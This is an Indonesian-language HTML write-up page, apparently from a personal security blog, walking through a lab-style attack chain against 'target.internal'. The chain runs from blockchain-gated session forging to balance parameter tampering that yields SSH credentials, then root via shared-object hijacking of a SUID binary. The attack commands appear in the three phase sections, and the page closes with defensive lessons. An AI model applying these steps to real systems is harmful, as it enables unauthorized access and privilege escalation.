@@ -1,0 +1,156 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Writeup: Web3 & Binary Hijacking | alif-cybersec</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link href="https://fonts.googleapis.com/css2?family=Fira+Code:wght@300;400;500;700&family=Inter:wght@400;600;800&display=swap" rel="stylesheet">
+    <style>
+        :root { --accent: #10b981; --dark: #020617; }
+        body { background-color: var(--dark); color: #e2e8f0; font-family: 'Inter', sans-serif; line-height: 1.6; }
+        .terminal-font { font-family: 'Fira Code', monospace; }
+        .glow-text { text-shadow: 0 0 15px rgba(16, 185, 129, 0.3); }
+        .accent-emerald { color: var(--accent); }
+        
+        .cyber-gradient {
+            background: linear-gradient(90deg, #fff 0%, var(--accent) 50%, #fff 100%);
+            background-size: 200% auto;
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            animation: shine 8s linear infinite;
+        }
+        @keyframes shine {
+            to { background-position: 200% center; }
+        }
+        
+        body::before {
+            content: " "; display: block; position: fixed; top: 0; left: 0; bottom: 0; right: 0;
+            background: linear-gradient(rgba(18, 16, 16, 0) 50%, rgba(0, 0, 0, 0.2) 50%), linear-gradient(90deg, rgba(255, 0, 0, 0.03), rgba(0, 255, 0, 0.01), rgba(0, 0, 255, 0.03));
+            z-index: 9999; background-size: 100% 4px, 3px 100%; pointer-events: none; opacity: 0.4;
+        }
+
+        .hero-banner { 
+            height: 350px; 
+            background: linear-gradient(to bottom, rgba(2, 6, 23, 0.4), var(--dark)), url('https://images.unsplash.com/photo-1639762681485-074b7f938ba0?auto=format&fit=crop&q=80&w=2000'); 
+            background-size: cover; background-position: center;
+            border-bottom: 1px solid rgba(16, 185, 129, 0.2);
+        }
+
+        .content-card { background: rgba(15, 23, 42, 0.6); border: 1px solid rgba(16, 185, 129, 0.1); backdrop-blur: xl; }
+        pre { background-color: #010409; border-left: 3px solid var(--accent); padding: 1.25rem; border-radius: 0.5rem; font-size: 0.85rem; overflow-x: auto; }
+        .step-num { font-size: 4rem; font-weight: 900; color: rgba(16, 185, 129, 0.05); position: absolute; left: -2rem; top: -1rem; line-height: 1; }
+    </style>
+</head>
+<body class="antialiased selection:bg-emerald-500/30">
+    <div class="hero-banner relative flex items-end pb-12">
+        <div class="max-w-4xl mx-auto w-full px-6">
+            <div class="inline-block px-3 py-1 bg-emerald-500/20 border border-emerald-500/40 rounded text-[10px] font-black uppercase tracking-[0.3em] accent-emerald mb-4">Research // Web3-003</div>
+            <h1 class="text-4xl md:text-7xl font-black tracking-tighter text-white glow-text">
+                Web3 Bridge <span class="accent-emerald">Hijacking</span>
+            </h1>
+        </div>
+    </div>
+
+    <div class="max-w-4xl mx-auto px-6 py-16">
+        <div class="flex flex-wrap gap-4 mb-16">
+            <span class="text-xs font-mono border border-slate-800 px-3 py-1 rounded bg-slate-900/50">#web3-interaction</span>
+            <span class="text-xs font-mono border border-slate-800 px-3 py-1 rounded bg-slate-900/50">#logic-flaw</span>
+            <span class="text-xs font-mono border border-slate-800 px-3 py-1 rounded bg-slate-900/50">#shared-object-hijacking</span>
+        </div>
+
+        <!-- Exec Summary -->
+        <section class="mb-24">
+            <div class="p-8 content-card rounded-2xl border-l-4 border-l-emerald-500 shadow-2xl">
+                <h2 class="text-xl font-bold accent-emerald mb-4 uppercase tracking-widest">Executive Summary</h2>
+                <p class="text-slate-300 italic text-lg leading-relaxed">
+                    "Operasi ini mendemonstrasikan kerentanan pada infrastruktur hibrida yang menggabungkan Dashboard Web2 dan Node Blockchain. Eksploitasi dimulai dari manipulasi logika bisnis pada platform trading hingga eskalasi hak akses Root melalui pembajakan library (Shared Object Hijacking) pada biner sistem SUID."
+                </p>
+            </div>
+        </section>
+
+        <!-- Phase 1: Blockchain Pivot -->
+        <section class="mb-24 relative">
+            <div class="step-num">01</div>
+            <h2 class="text-2xl font-bold accent-emerald mb-8 flex items-center">
+                <span class="mr-4 text-white opacity-20">/</span> Blockchain to Web Pivot
+            </h2>
+            <p class="text-slate-400 mb-6 leading-relaxed">
+                Pemindaian awal mengungkap layanan RPC Blockchain pada port 8545. Aplikasi web menggunakan status audit di blockchain sebagai gerbang autentikasi. Dengan berinteraksi langsung ke <em>Smart Contract</em>, kami memvalidasi integritas sesi secara manual.
+            </p>
+            <div class="bg-black/60 rounded-xl p-6 border border-slate-800 mb-8">
+                <div class="terminal-font text-xs space-y-2">
+                    <div class="text-slate-500"># Verifying transaction hash to generate session</div>
+                    <div class="text-emerald-400">curl -X POST -H "Content-Type: application/json" \
+     -d '{"integrity_hash": "0xd6a3af9b17a..."}' \
+     http://target.internal/api/v2/verify</div>
+                    <div class="mt-2 text-white">RESULT: session_id = <span class="text-emerald-500">1775577374620_anon_sec</span></div>
+                </div>
+            </div>
+        </section>
+
+        <!-- Phase 2: Logic Flaw -->
+        <section class="mb-24 relative">
+            <div class="step-num">02</div>
+            <h2 class="text-2xl font-bold accent-emerald mb-8 flex items-center">
+                <span class="mr-4 text-white opacity-20">/</span> Business Logic: Parameter Tampering
+            </h2>
+            <p class="text-slate-400 mb-6 leading-relaxed">
+                Platform memiliki fitur trading yang memberikan kredensial SSH jika saldo mencapai ambang batas tertentu. Ditemukan celah <em>Parameter Tampering</em> pada endpoint reset saldo yang memungkinkan manipulasi nilai secara bebas.
+            </p>
+            <pre class="terminal-font text-emerald-400">
+<span class="text-slate-500"># Manipulating account balance via API</span>
+POST /api/trading/reset?session_id=1775577374620_anon_sec
+{ "balance": 99999 }
+
+<span class="text-white">RESULT: Kredensial SSH diperoleh (operator : P@ssw0rd_Acc3ss)</span>
+            </pre>
+        </section>
+
+        <!-- Phase 3: Root Access -->
+        <section class="mb-24 relative">
+            <div class="step-num">03</div>
+            <h2 class="text-2xl font-bold accent-emerald mb-8 flex items-center">
+                <span class="mr-4 text-white opacity-20">/</span> PrivEsc: Shared Object Hijacking
+            </h2>
+            <p class="text-slate-400 mb-6 leading-relaxed">
+                Setelah mendapatkan shell, ditemukan biner SUID <code>internal-sync</code> yang memuat library dari direktori dengan izin tulis global (<em>World Writable</em>).
+            </p>
+            <div class="bg-black/60 rounded-xl p-8 border border-slate-800 shadow-2xl">
+                <div class="terminal-font text-sm space-y-2">
+                    <div class="text-slate-500"># Compiling malicious shared object</div>
+                    <div class="text-emerald-400">gcc -shared -o /tmp/libaudit_core.so -fPIC payload.c</div>
+                    <div class="text-slate-500"># Replacing original library</div>
+                    <div class="text-emerald-400">cp /tmp/libaudit_core.so /opt/internal/lib/writable/</div>
+                    <div class="text-yellow-400 mt-4">./internal-sync</div>
+                    <div class="text-white font-black text-lg">root# <span class="text-emerald-500">whoami</span></div>
+                    <div class="text-emerald-500">root</div>
+                </div>
+            </div>
+        </section>
+
+        <!-- Lessons -->
+        <section class="mb-20 border-t border-slate-800 pt-16">
+            <h2 class="text-xl font-bold accent-emerald mb-10 flex items-center tracking-widest"><span class="mr-4 opacity-50 text-white">04</span> LESSONS LEARNED</h2>
+            <div class="grid grid-cols-1 md:grid-cols-3 gap-6 text-sm">
+                <div class="p-6 content-card rounded-xl">
+                    <div class="text-white font-bold mb-2">Web3 Safety</div>
+                    <p class="text-slate-500 leading-relaxed">Gunakan verifikasi off-chain yang kuat untuk sinkronisasi data blockchain ke aplikasi web.</p>
+                </div>
+                <div class="p-6 content-card rounded-xl">
+                    <div class="text-white font-bold mb-2">Logic Validation</div>
+                    <p class="text-slate-500 leading-relaxed">Input sensitif seperti saldo harus divalidasi di sisi server (Server-side validation).</p>
+                </div>
+                <div class="p-6 content-card rounded-xl">
+                    <div class="text-white font-bold mb-2">Folder Permissions</div>
+                    <p class="text-slate-500 leading-relaxed">Jangan pernah memberikan izin tulis global (777) pada direktori library sistem.</p>
+                </div>
+            </div>
+        </section>
+
+        <footer class="pt-16 border-t border-slate-800 text-center">
+            <a href="../index.html" class="inline-block px-10 py-3 bg-emerald-600 hover:bg-emerald-500 text-white font-bold rounded-lg transition-all shadow-lg">RETURN TO DASHBOARD</a>
+        </footer>
+    </div>
+</body>
+</html>
